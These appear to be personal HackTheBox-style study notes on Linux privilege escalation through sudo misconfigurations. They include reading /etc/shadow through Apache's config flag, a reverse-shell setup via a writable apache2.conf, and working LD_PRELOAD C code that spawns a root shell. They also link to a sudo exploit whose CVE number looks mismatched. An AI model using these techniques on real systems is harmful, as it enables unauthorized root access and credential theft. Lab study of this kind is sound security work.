# Leverage application functions
## Apache2 Server
###### Method 1
```sh
sudo -l

User can run the following commands as root
	sudo (NOPASSWD): /usr/bin/apache2
```

As you can see below, Apache2 has an *option that supports loading alternative configuration files* (`-f`).
![[Pasted image 20230520114651.png]]
Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.


###### Method 2
```sh
ls -al /etc/apache2

-rwxrwxrwx  1 root root  7094 NOV 7  2023 apache2.conf

# Also, you should be able to restart the apache2 server, either by default or through Sudo

sudo -l
User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/systemctl start apache2
    (ALL) NOPASSWD: /bin/systemctl stop apache2
    (ALL) NOPASSWD: /bin/systemctl restart apache2
```

1. First modify `apache2.conf` file to change the web user with new one.
```sh
## /etc/apache2/apache2.conf
# These need to be set in /etc/apache2/envvars
User [username]
Group [username]

## Setting it to "root" user might not work so try other users
```

2. In the web directory (e.g. /var/www/html), create the script `rev-shell.php` to reverse shell.
3. Restart Apache2 server
4. Start `nc` & visit /rev-shell.php to get shell as a new user!



## Nginx
https://0xdf.gitlab.io/2023/11/09/htb-broker.html#shell-as-root

---
## Leverage Other users
```sh
aaryan11x@htb[/htb]$ sudo -l

    (user : user) NOPASSWD: /bin/echo
```

The **NOPASSWD** entry shows that the `/bin/echo` command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says user, we can run `sudo` as *that user and not as root*. To do so, we can specify the user with `-u` user:

```sh
aaryan11x@htb[/htb]$ sudo -u user /bin/echo Hello World!

    Hello World!
```


## Leverage Other Host
![[Pasted image 20231101215206.png]]

```sh
sudo -h ssalg-gnikool /bin/bash -p
```


---
# Leverage LD_PRELOAD
**LD_PRELOAD** is an *environment variable* in Linux systems that allows you to *load and run your own shared libraries before the standard system libraries are loaded*. In simpler terms, it gives you the ability to *override or intercept function calls made by programs and replace them with your own custom functions*.

For More Info, [Go Here](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)

The steps of this privilege escalation vector can be summarized as follows;

1.  **Check for LD_PRELOAD (with the env_keep option)**
Run `sudo -l`
![[Pasted image 20230520121643.png]]

2.  **Write a simple C code compiled as a share object (.so extension) file**

The C code will simply spawn a root shell and can be written as follows;

```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
// Save this in shell.c
```

3.  **Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file**

```sh
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

![[Pasted image 20230520122007.png]]

```sh
sudo LD_PRELOAD=/home/user/ldpreload/shell.so [command with sudo priviliges]
# Ex: sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

This will result in a *shell spawn* with ***root privileges***.

---
# Shutdown command Priv Esc
```sh
sudo -l

(ALL) NOPASS: /usr/sbin/shutdown
```

1) Try https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/
2) If not working, search for a process that executes during startup using [[pspy]] or `linpeas.sh`

---
# Vulnerable Version (1.8.21, 1.8.31, 1.8.27)
https://github.com/blasty/CVE-2021-31561

---
# tcpdump
```sh
# View network traffic with tcpdump if you have the permissions (-A for ASCII)
sudo tcpdump -i lo -A

# Sniff UDP packets & show it's contents
tcpdump -i ens192 -SX udp

# Sniff UDP packet on port 169
tcpdump -i ens192 -SX udp port 169
```
